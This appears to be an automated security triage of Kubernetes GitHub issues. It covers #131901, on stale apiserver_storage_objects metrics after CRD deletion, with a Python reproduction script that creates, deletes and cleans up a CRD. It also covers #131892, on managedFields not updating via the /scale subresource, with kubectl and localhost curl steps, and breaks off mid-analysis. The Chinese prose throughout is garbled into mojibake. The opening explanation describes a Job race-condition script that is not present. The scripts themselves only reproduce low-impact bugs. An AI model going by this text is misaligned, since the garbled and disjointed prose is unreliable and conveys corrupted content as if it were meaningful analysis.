è¯¥Pythonè„šæœ¬æ—¨åœ¨é€šè¿‡ç¼–ç¨‹æ–¹å¼å¤ç°Issueä¸­æè¿°çš„ç«æ€æ¡ä»¶æ¼æ´ã€‚

1.  **ç¯å¢ƒå‡†å¤‡**ï¼šè„šæœ¬é¦–å…ˆä½¿ç”¨`kubernetes` Pythonå®¢æˆ·ç«¯åº“åŠ è½½æœ¬åœ°çš„`kubeconfig`æ–‡ä»¶ï¼Œä»¥è·å¾—ä¸Kubernetesé›†ç¾¤äº¤äº’çš„æƒé™ã€‚
2.  **Jobå®šä¹‰**ï¼š`create_job_manifest`å‡½æ•°å®šä¹‰äº†ä¸€ä¸ªç®€å•çš„Jobï¼Œè¯¥Jobè¿è¡Œä¸€ä¸ªPerlå®¹å™¨æ¥è®¡ç®—åœ†å‘¨ç‡ï¼Œè¿™æ˜¯ä¸€ä¸ªå¸¸è§çš„ç¤ºä¾‹å·¥ä½œè´Ÿè½½ã€‚
3.  **æ ¸å¿ƒé€»è¾‘**ï¼š
    *   è„šæœ¬åœ¨ä¸€ä¸ªå¾ªç¯ä¸­è¿è¡Œï¼Œæ€»è¿è¡Œæ—¶é•¿ä¸è¶…è¿‡120ç§’ï¼Œä»¥é˜²æ­¢æ— é™æ‰§è¡Œã€‚
    *   åœ¨æ¯æ¬¡å¾ªç¯å°è¯•ä¸­ï¼Œè„šæœ¬ä¸¥æ ¼éµå¾ªIssueä¸­æè¿°çš„æ­¥éª¤ï¼š
        a.  **åˆ›å»ºJob**ï¼šè°ƒç”¨`create_namespaced_job`åˆ›å»ºä¸€ä¸ªæ–°çš„Jobã€‚
        b.  **ç«‹å³åˆ é™¤**ï¼šç´§æ¥ç€ï¼Œè°ƒç”¨`delete_namespaced_job`å¹¶ä½¿ç”¨`propagation_policy="Background"`ç­–ç•¥ã€‚è¿™ä¼šç«‹å³è¿”å›ï¼Œè®©åˆ é™¤æ“ä½œåœ¨åå°è¿›è¡Œï¼Œè¿™æ˜¯è§¦å‘ç«æ€æ¡ä»¶çš„å…³é”®ï¼Œå› ä¸ºå®ƒæœ€å¤§åŒ–äº†æ–°Jobåœ¨æ—§Jobçš„æ¸…ç†é€»è¾‘å®Œæˆå‰è¢«åˆ›å»ºçš„å¯èƒ½æ€§ã€‚
        c.  **ç«‹å³é‡æ–°åˆ›å»º**ï¼šå†æ¬¡è°ƒç”¨`create_namespaced_job`ï¼Œä½¿ç”¨å®Œå…¨ç›¸åŒçš„åç§°å’Œå®šä¹‰æ¥åˆ›å»ºJobã€‚
4.  **ç»“æœéªŒè¯**ï¼š
    *   åœ¨æ‰§è¡Œä¸Šè¿°ä¸‰æ­¥æ“ä½œåï¼Œè„šæœ¬ä¼šç­‰å¾…20ç§’ã€‚è¿™ä¸ªç­‰å¾…æ—¶é—´æ˜¯ä¸ºäº†ç»™Jobæ§åˆ¶å™¨è¶³å¤Ÿçš„æ—¶é—´æ¥å¤„ç†è¿™äº›äº‹ä»¶ã€‚
    *   ä¹‹åï¼Œå®ƒä¼šé€šè¿‡æ ‡ç­¾é€‰æ‹©å™¨`job-name=<job_name>`æ¥æŸ¥è¯¢ä¸è¯¥Jobå…³è”çš„Podã€‚
    *   å¦‚æœæŸ¥è¯¢ç»“æœä¸ºç©ºï¼ˆå³`pods.items`åˆ—è¡¨ä¸ºç©ºï¼‰ï¼Œåˆ™è¯´æ˜å¤ç°æˆåŠŸï¼šæ–°åˆ›å»ºçš„Jobå› ä¸ºæ§åˆ¶å™¨ä¸­æ®‹ç•™çš„â€œæœŸæœ›â€è€Œé™·å…¥åƒµå±€ï¼Œæœªèƒ½åˆ›å»ºå‡ºPodã€‚è„šæœ¬ä¼šæ‰“å°æˆåŠŸä¿¡æ¯å¹¶é€€å‡ºã€‚
    *   å¦‚æœæŸ¥è¯¢åˆ°äº†Podï¼Œè¯´æ˜æœ¬æ¬¡å°è¯•æœªèƒ½è§¦å‘è¯¥ç«æ€æ¡ä»¶ï¼Œè„šæœ¬ä¼šæ¸…ç†æ‰å·²åˆ›å»ºçš„Jobå’ŒPodï¼Œç„¶åå¼€å§‹ä¸‹ä¸€æ¬¡å°è¯•ã€‚
5.  **æ¸…ç†æœºåˆ¶**ï¼šè„šæœ¬åŒ…å«äº†`cleanup_job`å‡½æ•°ï¼Œå¹¶åœ¨æ¯æ¬¡å°è¯•å¤±è´¥åå’Œè„šæœ¬ç»“æŸæ—¶è°ƒç”¨ï¼Œä»¥ç¡®ä¿ä¸ä¼šåœ¨é›†ç¾¤ä¸­ç•™ä¸‹æµ‹è¯•ç”¨çš„Jobæˆ–Podã€‚

é€šè¿‡åœ¨çŸ­æ—¶é—´å†…å¾ªç¯æ‰§è¡Œâ€œåˆ›å»º-åˆ é™¤-å†åˆ›å»ºâ€è¿™ä¸ªåºåˆ—ï¼Œè¯¥è„šæœ¬å¢åŠ äº†è§¦å‘Jobæ§åˆ¶å™¨å†…éƒ¨ç«æ€æ¡ä»¶çš„æ¦‚ç‡ï¼Œä»è€Œæœ‰æ•ˆåœ°å¤ç°äº†è¯¥æ¼æ´ã€‚

---


## Issue #131901 apiserver_storage_objects metrics still exists after crd deleted

- Issue é“¾æ¥ï¼š[#131901](https://github.com/kubernetes/kubernetes/issues/131901)

### Issue å†…å®¹

#### What happened?

<img width="1498" alt="Image" src="https://github.com/user-attachments/assets/580f8f3f-ac8c-42ab-95b9-b367f27ba027" />

```bash
kubectl get ephemeralreports.reports.kyverno.io
error: the server doesn't have a resource type "ephemeralreports"
```

apiserver_storage_objects metrics still exists after crd deleted

#### What did you expect to happen?

remove apiserver_storage_objects metrics after crd deleted

#### How can we reproduce it (as minimally and precisely as possible)?

Create a CRD
Create some CR for CRD
Check apiserver_storage_objects metrics
Delete CRD
Check apiserver_storage_objects metrics

#### Anything else we need to know?

_No response_

#### Kubernetes version

v1.32.0


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªåœ¨Kubernetes APIServerä¸­å­˜åœ¨çš„é—®é¢˜ï¼šå½“ä¸€ä¸ªè‡ªå®šä¹‰èµ„æºå®šä¹‰ï¼ˆCRDï¼‰è¢«åˆ é™¤åï¼Œå…¶å¯¹åº”çš„`apiserver_storage_objects`ç›‘æ§æŒ‡æ ‡ï¼ˆMetricï¼‰å¹¶æœªè¢«ç›¸åº”åœ°æ¸…ç†ï¼Œè€Œæ˜¯ç»§ç»­å­˜åœ¨äº`/metrics`ç«¯ç‚¹ä¸­ã€‚

ä»å®‰å…¨è§’åº¦åˆ†æï¼Œè¯¥é—®é¢˜å­˜åœ¨æ½œåœ¨çš„å®‰å…¨é£é™©ï¼Œä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹ä¸¤ä¸ªæ–¹é¢ï¼š

1.  **å¯ç”¨æ€§é£é™©ï¼ˆæ‹’ç»æœåŠ¡ DoSï¼‰**ï¼šè¿™æ˜¯æœ€ä¸»è¦çš„é£é™©ã€‚`apiserver_storage_objects`æŒ‡æ ‡çš„ç”¨é€”æ˜¯è¿½è¸ªå­˜å‚¨åœ¨etcdä¸­çš„æ¯ç§èµ„æºå¯¹è±¡çš„æ•°é‡ã€‚å¦‚æœåˆ é™¤CRDåæŒ‡æ ‡é¡¹ä¸è¢«æ¸…ç†ï¼Œé‚£ä¹ˆä¸€ä¸ªæ‹¥æœ‰åˆ›å»ºå’Œåˆ é™¤CRDæƒé™çš„æ”»å‡»è€…ï¼ˆé€šå¸¸éœ€è¦å¾ˆé«˜çš„æƒé™ï¼Œå¦‚`cluster-admin`ï¼‰å¯ä»¥é€šè¿‡åå¤åˆ›å»ºä¸åŒåç§°çš„CRDå¹¶éšååˆ é™¤å®ƒä»¬ï¼Œæ¥ä¸æ–­åœ°åœ¨APIServerçš„`/metrics`ç«¯ç‚¹ä¸­ç´¯ç§¯æ— ç”¨çš„æŒ‡æ ‡é¡¹ã€‚è¿™ä¼šå¯¼è‡´â€œæŒ‡æ ‡åŸºæ•°çˆ†ç‚¸â€ï¼ˆMetric Cardinality Explosionï¼‰ã€‚å½“æŒ‡æ ‡æ•°é‡å·¨å¤§æ—¶ï¼Œä¼šäº§ç”Ÿä»¥ä¸‹è´Ÿé¢å½±å“ï¼š
    *   APIServeråœ¨ç”Ÿæˆ`/metrics`å“åº”æ—¶ä¼šæ¶ˆè€—æ›´å¤šçš„å†…å­˜å’ŒCPUã€‚
    *   ç›‘æ§ç³»ç»Ÿï¼ˆå¦‚Prometheusï¼‰åœ¨æŠ“å–ï¼ˆscrapeï¼‰å’Œå­˜å‚¨è¿™äº›æŒ‡æ ‡æ—¶ä¼šæ¶ˆè€—å¤§é‡èµ„æºï¼Œå¯èƒ½å¯¼è‡´ç›‘æ§ç³»ç»Ÿæ€§èƒ½ä¸‹é™ç”šè‡³å´©æºƒã€‚
    *   æœ€ç»ˆå¯èƒ½å½±å“APIServerçš„ç¨³å®šæ€§å’Œå“åº”èƒ½åŠ›ï¼Œæ„æˆä¸€ç§ç¼“æ…¢çš„æ‹’ç»æœåŠ¡æ”»å‡»ã€‚

2.  **ä¿¡æ¯æ³„éœ²é£é™©ï¼ˆè½»å¾®ï¼‰**ï¼šæŒä¹…åŒ–çš„æŒ‡æ ‡é¡¹ä¼šæš´éœ²æ›¾ç»åœ¨é›†ç¾¤ä¸­å­˜åœ¨è¿‡çš„CRDçš„åç§°ï¼ˆä¾‹å¦‚ï¼Œ`resource="ephemeralreports.reports.kyverno.io"`ï¼‰ã€‚å¦‚æœCRDçš„å‘½ååŒ…å«äº†æŸäº›æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚é¡¹ç›®ä»£å·ã€å†…éƒ¨æœåŠ¡åç­‰ï¼‰ï¼Œå³ä½¿CRDè¢«åˆ é™¤äº†ï¼Œè¿™äº›ä¿¡æ¯ä»ç„¶ä¼šé€šè¿‡`/metrics`ç«¯ç‚¹æ³„éœ²ç»™æœ‰æƒè®¿é—®è¯¥ç«¯ç‚¹çš„ç”¨æˆ·æˆ–ç³»ç»Ÿã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤é—®é¢˜å±äºå®‰å…¨é—®é¢˜ã€‚æˆ‘ä»¬ä½¿ç”¨CVSS 3.1è¿›è¡Œè¯„ä¼°ï¼š
*   **Attack Vector (AV): Network** - æ”»å‡»è€…é€šè¿‡ç½‘ç»œè®¿é—®K8s APIã€‚
*   **Attack Complexity (AC): Low** - åˆ›å»ºå’Œåˆ é™¤CRDçš„æ“ä½œå¹¶ä¸å¤æ‚ã€‚
*   **Privileges Required (PR): High** - æ”»å‡»è€…å¿…é¡»æ‹¥æœ‰åˆ›å»ºå’Œåˆ é™¤CRDçš„æƒé™ï¼Œè¿™é€šå¸¸æ˜¯é›†ç¾¤ç®¡ç†å‘˜çº§åˆ«çš„æƒé™ã€‚
*   **User Interaction (UI): None** - æ— éœ€ç”¨æˆ·äº¤äº’ã€‚
*   **Scope (S): Unchanged** - æ¼æ´å½±å“çš„ç»„ä»¶ï¼ˆAPIServerï¼‰å’Œæ”»å‡»è€…èƒ½å¤Ÿå½±å“çš„ç»„ä»¶èŒƒå›´æ˜¯ç›¸åŒçš„ã€‚
*   **Confidentiality (C): None** - æ³„éœ²çš„èµ„æºåç§°é€šå¸¸ä¸è¢«è§†ä¸ºæœºå¯†ä¿¡æ¯ã€‚
*   **Integrity (I): None** - æ— æ³•ä¿®æ”¹æ•°æ®ã€‚
*   **Availability (A): Low** - å¯èƒ½ä¼šé™ä½APIServerå’Œç›‘æ§ç³»ç»Ÿçš„æ€§èƒ½ï¼Œä½†éœ€è¦å¤§é‡æ“ä½œæ‰èƒ½äº§ç”Ÿæ˜¾è‘—å½±å“ï¼Œä¸”æ‹¥æœ‰æ­¤æƒé™çš„æ”»å‡»è€…æœ‰æ›´ç›´æ¥çš„DoSæ‰‹æ®µã€‚

ç»¼åˆè¯„åˆ†ä¸º **CVSS 3.1: 2.7 (Low)**ã€‚æ ¹æ®æ ‡å‡†ï¼Œæ­¤é—®é¢˜å±äº **ä½é£é™©**ã€‚å°½ç®¡å­˜åœ¨DoSçš„å¯èƒ½æ€§ï¼Œä½†ç”±äºåˆ©ç”¨è¯¥æ¼æ´éœ€è¦éå¸¸é«˜çš„æƒé™ï¼Œå…¶å®é™…å¨èƒè¢«å¤§å¤§é™ä½ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import uuid
import signal
import sys
from kubernetes import client, config, watch
from kubernetes.client.rest import ApiException

# ä¸ºè„šæœ¬è®¾ç½®2åˆ†é’Ÿçš„è¶…æ—¶é€€å‡ºæœºåˆ¶
def timeout_handler(signum, frame):
    """è¶…æ—¶å¤„ç†å™¨"""
    print("é”™è¯¯: è„šæœ¬æ‰§è¡Œè¶…è¿‡2åˆ†é’Ÿï¼Œè¶…æ—¶é€€å‡ºã€‚", file=sys.stderr)
    raise TimeoutError("è„šæœ¬æ‰§è¡Œæ—¶é—´è¶…è¿‡120ç§’")

def main():
    """ä¸»æ‰§è¡Œå‡½æ•°"""
    # æ³¨å†Œä¿¡å·å¤„ç†å™¨ï¼Œè®¾ç½®120ç§’åè§¦å‘
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(120)

    # --- 1. åŠ è½½Kubeconfigå¹¶åˆ›å»ºAPIå®¢æˆ·ç«¯ ---
    try:
        config.load_kube_config()
        apiext_api = client.ApiextensionsV1Api()
        # ä»å·²æœ‰APIå®¢æˆ·ç«¯è·å–é€šç”¨api_clientï¼Œç”¨äºåŸå§‹APIè°ƒç”¨
        api_client = apiext_api.api_client
        print("æˆåŠŸåŠ è½½ Kubernetes é…ç½®ã€‚")
    except Exception as e:
        print(f"é”™è¯¯: åŠ è½½ Kubernetes é…ç½®å¤±è´¥: {e}", file=sys.stderr)
        print("è¯·ç¡®ä¿æ‚¨çš„ kubeconfig æ–‡ä»¶å·²æ­£ç¡®é…ç½®åœ¨é»˜è®¤ä½ç½®ã€‚", file=sys.stderr)
        return

    # --- 2. å®šä¹‰ä¸€ä¸ªå”¯ä¸€çš„CRD ---
    # ä½¿ç”¨UUIDç¡®ä¿æ¯æ¬¡è¿è¡Œçš„CRDåç§°éƒ½æ˜¯å”¯ä¸€çš„ï¼Œé¿å…å†²çª
    unique_id = uuid.uuid4().hex[:8]
    crd_group = "poc.reproduce.com"
    crd_version = "v1"
    crd_plural = f"poc-leaks-{unique_id}"
    crd_kind = "PocLeak"
    crd_name = f"{crd_plural}.{crd_group}"
    
    # å®šä¹‰å¾…æœç´¢çš„æŒ‡æ ‡åç§°
    metric_search_key = f'apiserver_storage_objects{{resource="{crd_plural}"}}'

    crd_manifest = {
        "apiVersion": "apiextensions.k8s.io/v1",
        "kind": "CustomResourceDefinition",
        "metadata": {"name": crd_name},
        "spec": {
            "group": crd_group,
            "names": {
                "plural": crd_plural,
                "singular": f"poc-leak-{unique_id}",
                "kind": crd_kind,
            },
            "scope": "Cluster",
            "versions": [
                {
                    "name": crd_version,
                    "served": True,
                    "storage": True,
                    "schema": {
                        "openAPIV3Schema": {
                            "type": "object",
                            "properties": {
                                "spec": {
                                    "type": "object",
                                    "properties": {"info": {"type": "string"}},
                                }
                            },
                        }
                    },
                }
            ],
        },
    }

    try:
        # --- 3. åˆ›å»ºCRDå¹¶ç­‰å¾…å…¶å°±ç»ª ---
        print(f"æ­£åœ¨åˆ›å»ºCRD: {crd_name}...")
        apiext_api.create_custom_resource_definition(body=crd_manifest)
        print("CRDå·²åˆ›å»ºï¼Œç­‰å¾…å…¶çŠ¶æ€å˜ä¸º'Established'...")

        # ç­‰å¾…CRDå®Œå…¨å»ºç«‹ï¼Œæœ€å¤šç­‰å¾…60ç§’
        w = watch.Watch()
        for event in w.stream(apiext_api.list_custom_resource_definition, timeout_seconds=60):
            crd_obj = event['object']
            if crd_obj.metadata.name == crd_name:
                if crd_obj.status and crd_obj.status.conditions:
                    for condition in crd_obj.status.conditions:
                        if condition.type == 'Established' and condition.status == "True":
                            print("CRD å·²æˆåŠŸå»ºç«‹ã€‚")
                            w.stop()
                            break
            if not w.is_open():
                break
        
        # ä¸ºäº†è®©APIServeræœ‰æ—¶é—´æ›´æ–°æŒ‡æ ‡ï¼ŒçŸ­æš‚ç­‰å¾…
        print("ç­‰å¾…5ç§’ä»¥ä¾¿APIServeræ›´æ–°æŒ‡æ ‡...")
        time.sleep(5)

        # --- 4. æ£€æŸ¥åˆ é™¤CRDå‰çš„æŒ‡æ ‡ ---
        print("\næ­£åœ¨æ£€æŸ¥CRDåˆ é™¤å‰çš„metrics...")
        # ä½¿ç”¨åŸå§‹APIè°ƒç”¨è·å–/metricsç«¯ç‚¹å†…å®¹
        metrics_before_resp, _, _ = api_client.call_api(
            '/metrics', 'GET', response_type='str', _preload_content=False
        )
        metrics_before_data = metrics_before_resp.data.decode('utf-8')

        metric_found_before = any(line.startswith(metric_search_key) for line in metrics_before_data.splitlines())
        
        if metric_found_before:
            print(f"æˆåŠŸ: åœ¨åˆ é™¤CRDå‰æ‰¾åˆ°æŒ‡æ ‡ '{metric_search_key}'ã€‚")
        else:
            # å¦‚æœä¸€å¼€å§‹å°±æ‰¾ä¸åˆ°ï¼Œå¯èƒ½æ˜¯APIServerå»¶è¿Ÿï¼Œæµ‹è¯•å¯èƒ½ä¸å‡†ç¡®
            print(f"è­¦å‘Š: åœ¨åˆ é™¤CRDå‰æœªæ‰¾åˆ°æŒ‡æ ‡ '{metric_search_key}'ã€‚æµ‹è¯•å¯èƒ½æ— æ³•å¾—å‡ºç»“è®ºã€‚", file=sys.stderr)

        # --- 5. åˆ é™¤CRD ---
        print(f"\næ­£åœ¨åˆ é™¤CRD: {crd_name}...")
        apiext_api.delete_custom_resource_definition(name=crd_name)
        print("CRDåˆ é™¤è¯·æ±‚å·²å‘é€ã€‚ç­‰å¾…15ç§’ä»¥ç¡®ä¿èµ„æºæ¸…ç†...")
        time.sleep(15) # ç­‰å¾…APIServerå¤„ç†åˆ é™¤å’Œç›¸å…³GC

        # --- 6. æ£€æŸ¥åˆ é™¤CRDåçš„æŒ‡æ ‡ ---
        print("\næ­£åœ¨æ£€æŸ¥CRDåˆ é™¤åçš„metrics...")
        metrics_after_resp, _, _ = api_client.call_api(
            '/metrics', 'GET', response_type='str', _preload_content=False
        )
        metrics_after_data = metrics_after_resp.data.decode('utf-8')

        reproduced = False
        for line in metrics_after_data.splitlines():
            if line.startswith(metric_search_key):
                print("\n##############################################")
                print("å¤ç°æˆåŠŸ: é—®é¢˜å·²ç¡®è®¤ï¼")
                print(f"åœ¨CRDåˆ é™¤åï¼Œä¾ç„¶æ‰¾åˆ°äº†æ®‹ç•™çš„æŒ‡æ ‡é¡¹: {line}")
                print("##############################################")
                reproduced = True
                break
        
        if not reproduced:
            print("\nå¤ç°å¤±è´¥: æœªèƒ½æ‰¾åˆ°æ®‹ç•™çš„æŒ‡æ ‡é¡¹ï¼Œè¯¥é—®é¢˜å¯èƒ½å·²åœ¨æ‚¨çš„ç¯å¢ƒä¸­ä¿®å¤æˆ–ä¸å­˜åœ¨ã€‚")

    except TimeoutError:
        # è¶…æ—¶é”™è¯¯å·²åœ¨å¤„ç†å™¨ä¸­æ‰“å°ä¿¡æ¯
        pass
    except Exception as e:
        print(f"\nè„šæœ¬æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿæ„å¤–é”™è¯¯: {e}", file=sys.stderr)
    finally:
        # --- 7. ç¡®ä¿æ¸…ç† ---
        print("\næ‰§è¡Œæœ€ç»ˆæ¸…ç†...")
        try:
            # å†æ¬¡å°è¯•åˆ é™¤CRDä»¥é˜²è„šæœ¬ä¸­é€”å¤±è´¥
            apiext_api.delete_custom_resource_definition(name=crd_name)
            print(f"å·²ç¡®è®¤CRD '{crd_name}' è¢«åˆ é™¤ã€‚")
        except ApiException as e:
            if e.status == 404:
                print(f"CRD '{crd_name}' å·²ä¸å­˜åœ¨ï¼Œæ¸…ç†å®Œæˆã€‚")
            else:
                print(f"åœ¨æœ€ç»ˆæ¸…ç†CRD '{crd_name}' æ—¶å‘ç”Ÿé”™è¯¯: {e}", file=sys.stderr)
        # å–æ¶ˆè¶…æ—¶å‘Šè­¦
        signal.alarm(0)

# ç›´æ¥è°ƒç”¨ä¸»å‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬ç”¨äºå¤ç°`apiserver_storage_objects`æŒ‡æ ‡åœ¨CRDåˆ é™¤åæœªè¢«æ¸…ç†çš„é—®é¢˜ã€‚è„šæœ¬ä¾èµ–`kubernetes` Pythonåº“ï¼Œå¹¶å‡è®¾è¿è¡Œç¯å¢ƒä¸­å·²é…ç½®å¥½`kubeconfig`æ–‡ä»¶ã€‚

è„šæœ¬æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š
1.  **åˆå§‹åŒ–ä¸è¶…æ—¶è®¾ç½®**ï¼šè„šæœ¬å¼€å§‹æ—¶ä¼šè®¾ç½®ä¸€ä¸ª2åˆ†é’Ÿçš„å…¨å±€è¶…æ—¶å®šæ—¶å™¨ï¼Œä»¥é˜²æ­¢å› æ„å¤–æƒ…å†µå¯¼è‡´è„šæœ¬æ°¸ä¹…æŒ‚èµ·ã€‚
2.  **åŠ è½½é…ç½®**ï¼šä½¿ç”¨`kubernetes.config.load_kube_config()`åŠ è½½é»˜è®¤çš„Kubernetesé›†ç¾¤è®¿é—®å‡­è¯ã€‚
3.  **å®šä¹‰å¹¶åˆ›å»ºå”¯ä¸€CRD**ï¼šä¸ºäº†ä½¿è„šæœ¬å¯é‡å¤è¿è¡Œè€Œä¸äº§ç”Ÿå†²çªï¼Œè„šæœ¬ä¼šç”Ÿæˆä¸€ä¸ªåŒ…å«éšæœºUUIDçš„CRDåç§°ï¼ˆä¾‹å¦‚ `poc-leaks-xxxxxxxx.poc.reproduce.com`ï¼‰ã€‚ç„¶åï¼Œå®ƒé€šè¿‡Kubernetes APIåˆ›å»ºè¿™ä¸ªCRDï¼Œå¹¶ç­‰å¾…å…¶çŠ¶æ€å˜ä¸º`Established`ï¼Œç¡®ä¿CRDå·²å®Œå…¨å¯ç”¨ã€‚
4.  **æ£€æŸ¥åˆå§‹æŒ‡æ ‡**ï¼šåœ¨åˆ é™¤CRDä¹‹å‰ï¼Œè„šæœ¬ä¼šé€šè¿‡è°ƒç”¨APIServerçš„`/metrics`æ¥å£ï¼Œè·å–æ‰€æœ‰ç›‘æ§æŒ‡æ ‡ã€‚ç„¶åï¼Œå®ƒä¼šæœç´¢æ˜¯å¦å­˜åœ¨ä¸æ–°åˆ›å»ºçš„CRDç›¸å…³çš„`apiserver_storage_objects`æŒ‡æ ‡é¡¹ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼Œæ­¤æ—¶åº”è¯¥èƒ½æ‰¾åˆ°è¯¥æŒ‡æ ‡ã€‚
5.  **åˆ é™¤CRD**ï¼šè„šæœ¬è°ƒç”¨APIåˆ é™¤ä¹‹å‰åˆ›å»ºçš„CRDï¼Œå¹¶ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œä»¥ç»™äºˆAPIServerè¶³å¤Ÿçš„æ—¶é—´æ¥å¤„ç†åˆ é™¤æ“ä½œå’Œç›¸å…³çš„åƒåœ¾å›æ”¶ã€‚
6.  **æ£€æŸ¥æ®‹ç•™æŒ‡æ ‡ï¼ˆæ ¸å¿ƒéªŒè¯æ­¥éª¤ï¼‰**ï¼šåœ¨CRDåˆ é™¤åï¼Œè„šæœ¬å†æ¬¡è·å–`/metrics`å†…å®¹ï¼Œå¹¶æœç´¢åŒä¸€ä¸ªæŒ‡æ ‡é¡¹ã€‚æ ¹æ®Issueæè¿°ï¼Œè¯¥æŒ‡æ ‡é¡¹æ­¤æ—¶ä¸åº”è¢«æ¸…ç†ï¼Œä»ç„¶å­˜åœ¨ã€‚
7.  **è¾“å‡ºç»“æœ**ï¼š
    *   å¦‚æœè„šæœ¬åœ¨åˆ é™¤CRDåä»ç„¶æ‰¾åˆ°äº†è¯¥æŒ‡æ ‡ï¼Œå®ƒå°†æ‰“å°â€œå¤ç°æˆåŠŸâ€ä¿¡æ¯ï¼Œå¹¶æ˜¾ç¤ºæ‰¾åˆ°çš„æ®‹ç•™æŒ‡æ ‡è¡Œï¼Œè¯æ˜äº†è¯¥é—®é¢˜çš„å­˜åœ¨ã€‚
    *   å¦‚æœæœªæ‰¾åˆ°ï¼Œåˆ™è¯´æ˜é—®é¢˜å¯èƒ½å·²ä¿®å¤æˆ–åœ¨å½“å‰ç¯å¢ƒä¸­ä¸å­˜åœ¨ã€‚
8.  **æœ€ç»ˆæ¸…ç†**ï¼šåœ¨`finally`å—ä¸­ï¼Œè„šæœ¬ä¼šå†æ¬¡å°è¯•åˆ é™¤CRDï¼Œä»¥ç¡®ä¿å³ä½¿è„šæœ¬ä¸­é€”å‡ºé”™ï¼Œæµ‹è¯•èµ„æºä¹Ÿèƒ½è¢«æ¸…ç†å¹²å‡€ã€‚åŒæ—¶ï¼Œå®ƒä¼šå–æ¶ˆè¶…æ—¶å®šæ—¶å™¨ã€‚

è¦è¿è¡Œæ­¤è„šæœ¬ï¼Œè¯·å…ˆå®‰è£…`kubernetes`åº“ (`pip install kubernetes`)ï¼Œå¹¶ç¡®ä¿æ‚¨çš„`kubectl`å¯ä»¥æ­£å¸¸è®¿é—®ç›®æ ‡é›†ç¾¤ã€‚

---


## Issue #131892 Managed fields are not updated when patching or updating the `/scale` subresource for custom and built-in resources

- Issue é“¾æ¥ï¼š[#131892](https://github.com/kubernetes/kubernetes/issues/131892)

### Issue å†…å®¹

#### What happened?
When updating or patching the `/scale` subresource of a custom or built-in resource, the managed field for `spec.replicas` is **not updated as expected if the object was originally created without specifying a value for the `spec.replicas` field**.


#### What did you expect to happen?

When updating or patching the `/scale` subresource, the managed field for `specReplicasPath` should be updated to reflect the subresource operation and the field manager used.


#### How can we reproduce it (as minimally and precisely as possible)?

1. **Create a CRD with a scale subresource:**
```yaml
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: mypods.example.com
spec:
  group: example.com
  versions:
    - name: v1
      served: true
      storage: true
      schema:
        openAPIV3Schema:
          type: object
          properties:
            spec:
              type: object
              properties:
                name:
                  type: string
                replicas:
                  type: integer
            status:
              type: object
              properties:
                replicas:
                  type: integer
      subresources:
        status: {}
        scale:
          specReplicasPath: .spec.replicas
          statusReplicasPath: .status.replicas
  scope: Namespaced
  names:
    plural: mypods
    singular: mypod
    kind: MyPod
    shortNames:
      - mpo
```
2. **Create a custom resource:**
```sh
kubectl apply --server-side --field-manager m1 -f - <<'EOF'
apiVersion: example.com/v1
kind: MyPod
metadata:
  name: test
spec:
  name: mypod
EOF
```

3. **Update or patch replicas using the `/scale` subresource:**  

   a. Update the `/scale` subresource:
   ```sh
   kubectl scale mypods.example.com test --replicas 2
   # Or via direct API call:
   curl -XPUT -H 'content-type: application/json' \
     'http://localhost:8001/apis/example.com/v1/namespaces/default/mypods/test/scale?fieldManager=m2' \
     -d '{"apiVersion": "autoscaling/v1", "kind": "Scale", "metadata": {"name": "test"}, "spec": {"replicas": 2}}'
   ```
   b. Patch the `/scale` subresource:
   ```sh
   kubectl patch mypods.example.com test --subresource scale --type merge --field-manager m2 -p '{"spec": {"replicas": 2}}'
   # Or via direct API call:
   curl -XPATCH -H 'content-type: application/merge-patch+json' \
     'http://localhost:8001/apis/example.com/v1/namespaces/default/mypods/test/scale?fieldManager=m2' \
     -d '{"spec": {"replicas": 2}}'
   ```

4. **Observe that `spec.replicas` is not in the managed fields:**
    ```sh
    kubectl get mypods.example.com test --show-managed-fields -o yaml
    ```
   Output:
    ```yaml
    apiVersion: example.com/v1
    kind: MyPod
    metadata:
      creationTimestamp: "2025-05-22T00:46:21Z"
      generation: 2
      managedFields:
      - apiVersion: example.com/v1
        fieldsType: FieldsV1
        fieldsV1:
          f:spec:
            f:name: {}
        manager: m1
        operation: Apply
        time: "2025-05-22T00:46:21Z"
      name: test
      namespace: default
      resourceVersion: "49104"
      uid: 87e87c4d-8557-4aaf-a9e4-15794ea8ad5d
    spec:
      name: mypod
      replicas: 2
    ```
For built-in types please see this [comment](https://github.com/kubernetes/kubernetes/issues/131892#issuecomment-2916836139).
#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.2
Kustomize Version: v5.5.0
Server Version: v1.32.4
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªåœ¨Kubernetesä¸­ä¸`managedFields`ç›¸å…³çš„ç¼ºé™·ã€‚`managedFields`æ˜¯æœåŠ¡å™¨ç«¯åº”ç”¨ï¼ˆServer-Side Applyï¼‰æœºåˆ¶çš„æ ¸å¿ƒï¼Œç”¨äºè¿½è¸ªå¯¹è±¡ä¸­æ¯ä¸ªå­—æ®µçš„ç®¡ç†è€…ï¼ˆfield managerï¼‰ï¼Œä»¥å®ç°æ›´æ™ºèƒ½çš„åˆå¹¶ç­–ç•¥å’Œå†²çªæ£€æµ‹ã€‚

